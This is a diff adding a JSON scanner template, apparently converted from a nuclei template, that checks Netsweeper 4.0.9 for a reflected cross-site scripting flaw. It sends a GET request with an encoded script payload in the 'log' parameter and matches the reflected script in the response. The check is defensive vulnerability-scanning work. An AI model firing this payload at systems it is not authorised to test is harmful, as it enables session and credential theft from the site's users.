@@ -1,0 +1,168 @@
+{
+  "id": "netsweeper-rxss",
+  "name": "Netsweeper 4.0.9 - Cross-Site Scripting",
+  "author": "daffainfo",
+  "severity": "HIGH",
+  "description": "Netsweeper 4.0.9 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.",
+  "references": [
+    "https://packetstormsecurity.com/files/download/133034/netsweeper-issues.tgz",
+    "https://www.exploit-db.com/exploits/37930"
+  ],
+  "tags": [
+    "edb",
+    "xss",
+    "packetstorm",
+    "netsweeper"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-79",
+  "cvssScore": "7.2",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/webadmin/reporter/view_server_log.php?server\u003dlocalhost\u0026act\u003dstats\u0026filename\u003d\u0026offset\u003d1\u0026count\u003d1000\u0026sortorder\u003d\u0026log\u003d%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\u0026offset\u003d\u0026sortitem\u003d\u0026filter\u003d",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\u003c/script\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "text/html"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "netsweeper-rxss",
+    "info": {
+      "name": "Netsweeper 4.0.9 - Cross-Site Scripting",
+      "author": "daffainfo",
+      "severity": "high",
+      "description": "Netsweeper 4.0.9 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.",
+      "reference": [
+        "https://packetstormsecurity.com/files/download/133034/netsweeper-issues.tgz",
+        "https://www.exploit-db.com/exploits/37930"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+        "cvss_score": "7.2",
+        "cwe_id": "CWE-79"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "edb,xss,packetstorm,netsweeper"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/webadmin/reporter/view_server_log.php?server\u003dlocalhost\u0026act\u003dstats\u0026filename\u003d\u0026offset\u003d1\u0026count\u003d1000\u0026sortorder\u003d\u0026log\u003d%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\u0026offset\u003d\u0026sortitem\u003d\u0026filter\u003d"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\u003c/script\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "text/html"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
